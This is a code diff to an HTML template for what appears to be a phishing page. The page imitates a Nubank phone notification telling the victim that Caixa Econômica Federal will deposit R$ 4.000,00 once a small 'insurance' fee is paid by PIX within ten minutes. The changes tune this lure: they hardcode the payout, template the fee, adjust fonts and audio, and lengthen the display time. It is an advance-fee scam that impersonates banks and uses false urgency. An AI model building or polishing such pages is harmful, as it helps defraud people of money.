@@ -424,26 +424,26 @@
 </head>
 <body>
     <!-- Notification -->
-    <div id="paymentNotification" class="notification" style="display: none; background-color: white; padding: 12px; border-radius: 12px;">
+    <div id="paymentNotification" class="notification" style="display: none; background-color: white; padding: 12px; border-radius: 12px; font-family: 'Inter', sans-serif;">
         <div class="flex justify-between items-start">
             <div class="flex-grow pr-2">
                 <div class="flex items-center mb-1">
                     <div class="w-6 h-6 rounded-[10px] mr-2 overflow-hidden">
                         <img id="bankLogo1" src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
                     </div>
-                    <span id="bankName1" class="text-gray-700 text-sm">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
+                    <span id="bankName1" class="text-gray-700 text-sm" style="font-family: 'Inter', sans-serif;">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
                 </div>
-                <div class="text-black text-base font-bold mb-1 flex items-center whitespace-nowrap overflow-hidden" style="text-overflow: ellipsis;">
+                <div class="text-black text-base font-bold mb-1 flex items-center whitespace-nowrap overflow-hidden" style="text-overflow: ellipsis; font-family: 'Inter', sans-serif;">
                     <span class="mr-2" style="font-size: 1.1em;">💰</span>
-                    Você vai receber R$ {{ '{:,.2f}'.format(amount).replace(',', '.').replace('.', ',') }}
+                    Você vai receber R$ 4.000,00
                 </div>
             </div>
             <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
                 <img id="bankLogo2" src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
             </div>
         </div>
-        <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word;">
-            Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$54,90 para depositar R$ {{ '{:,.2f}'.format(amount).replace(',', '.').replace('.', ',') }} em sua conta <span id="bankText">Nubank</span>. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
+        <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word; font-family: 'Inter', sans-serif;">
+            Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$ {{ "%.2f"|format(amount) }} para depositar R$ 4.000,00 em sua conta <span id="bankText" style="font-family: 'Inter', sans-serif;">Nubank</span>. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
         </div>
     </div>
 
@@ -621,6 +621,7 @@
     <!-- Notification Audio -->
     <audio id="notificationSound" preload="auto" style="display: none;">
         <source src="/static/sounds/notification.mp3" type="audio/mpeg">
+        <source src="/static/audio/notification.mp3" type="audio/mpeg">
     </audio>
 
     <script>
@@ -691,12 +692,12 @@
                     notification.style.display = 'block';
                     notification.style.animation = 'slideDown 0.5s forwards';
                     
-                    // Configurar o tempo para ocultar a notificação (12 segundos)
+                    // Configurar o tempo para ocultar a notificação (15 segundos)
                     setTimeout(function() {
                         if (notification.style.display !== 'none') {
                             hideNotification('slideUp');
                         }
-                    }, 12000);
+                    }, 15000);
                     
                     // Adicionar eventos de toque/mouse para detectar swipe
                     setupSwipeGesture(notification);
